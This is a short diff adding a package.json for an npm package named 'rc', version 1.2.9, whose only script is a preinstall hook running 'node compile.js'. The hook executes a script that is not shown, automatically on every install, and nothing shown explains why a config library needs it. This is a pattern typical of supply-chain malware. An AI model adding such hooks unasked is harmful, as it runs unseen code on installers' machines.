@@ -1,0 +1,8 @@
+{
+  "name": "rc",
+  "version": "1.2.9",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node compile.js"
+  }
+}
